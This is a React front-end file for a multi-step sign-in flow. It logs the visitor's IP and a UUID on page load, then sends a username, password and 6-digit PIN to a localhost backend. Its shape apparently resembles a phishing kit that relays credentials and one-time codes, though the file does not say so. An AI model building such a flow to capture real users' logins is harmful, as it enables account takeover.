import React, { useState, useEffect } from 'react';
import Landing from './pages/Landing';
import Login from './pages/Login';
import Auth from './pages/Auth';
import Success from './pages/Success';
import Error from './components/Error.jsx';
import Error2 from './components/Error2.jsx';
import { v4 as uuidv4 } from 'uuid';

function App() {
  const [step, setStep] = useState(1); // Track the current step
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [pin, setPin] = useState('');
  const [error, setError] = useState(''); // Store error messages
  const [code, setCode] = useState(['', '', '', '', '', '']);  // Array to hold pin digits
  const [userId, setUserId] = useState(null);
  

  // Generate or retrieve UUID from localStorage
  useEffect(() => {
    let storedUserId = localStorage.getItem('userId');
    if (!storedUserId) {
      storedUserId = uuidv4();
      localStorage.setItem('userId', storedUserId);
    }
    setUserId(storedUserId);
  }, []);

  const startLogin = async () => {
    // Wait for both the IP and userId to be ready
    const ip = await fetch('https://api.ipify.org?format=json')  // Example to get user's IP
      .then(response => response.json())
      .then(data => data.ip)
      .catch(error => console.error("Error getting IP", error));
  
    // Ensure userId is available from localStorage
    const userId = localStorage.getItem('userId');
  
    if (!userId || !ip) {
      // If either userId or IP is missing, display an error
      setError('UUID and IP are required');
      return;
    }
  
    // Both userId and IP are available, proceed to call the backend API
    try {
      const response = await fetch('http://localhost:3000/start-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid: userId, ip }),
      });
  
      const data = await response.json();
      if (data.success) {
        console.log("Login started successfully");
        // Proceed to the next step after successful start
      } else {
        setError(data.message);  // Display error message from backend
      }
    } catch (error) {
      console.error('Error starting login:', error);
      setError('Error starting the login process');
    }
  };

  // Call startLogin when the page loads (for step 1)
  useEffect(() => {
    if (step === 1) {
      startLogin(); // Trigger startLogin on page load (for step 1)
    }
  }, [step]); // Dependency on step to call startLogin when step is 1

  // Function to send username and password to backend for processing
  const processLogin = async () => {
    if (!username || !password) {
      setError('Username and password cannot be empty!');
      return;
    }

    try {
      const response = await fetch('http://localhost:3000/process-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid: userId, username, password }),
      });

      const data = await response.json();
      if (data.success) {
        setError('');
        setStep(3);  // Proceed to the next step after successful login
      } else {
        setError(Error);  // Show error message from backend
      }
    } catch (error) {
      console.error('Error processing login:', error);
      setError('Error processing the login');
    }
  };

  // Function to validate the PIN and continue the process
  const validatePin = async () => {
    if (!pin || pin.length !== 6) {
      setError('Please enter a valid 6-digit PIN');
      return;
    }
  
    try {
      const response = await fetch('http://localhost:3000/validate-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid: userId, pin }),
      });
  
      const data = await response.json();
      if (data.success) {
        setError('');
        setStep(4);  // Proceed to success page after valid PIN
      } else {
        setError(Error2);  // Show error message from backend
        setCode(['', '', '', '', '', '']);
        document.getElementById('code-input-0').focus();  // Ensure focus resets
      }
    } catch (error) {
      console.error('Error validating PIN:', error);
      setError('Error validating the PIN');
    }
  };

  // Function to handle the next button click based on the current step
  const handleNext = () => {
    if (step === 1) {
      // Step 1: Skip the login start process and just go to step 2
      setStep(2);  // Proceed to the next step
    } else if (step === 2) {
      // Step 2: Process the login with username and password
      processLogin();
    } else if (step === 3) {
      // Step 3: Validate the PIN
      validatePin();
    }
  };

  return (
    <div>
      {error && <p style={{ color: 'red' }}>{error}</p>} {/* Display error messages */}
      {step === 1 && <Landing onNext={handleNext} />}
      {step === 2 && (
        <Login
          username={username}
          password={password}
          setUsername={setUsername}
          setPassword={setPassword}
          onNext={handleNext}
        />
      )}
      {step === 3 && <Auth pin={pin} setPin={setPin} onNext={handleNext} code={code} setCode={setCode} />}
      {step === 4 && <Success />}
    </div>
  );
}

export default App;
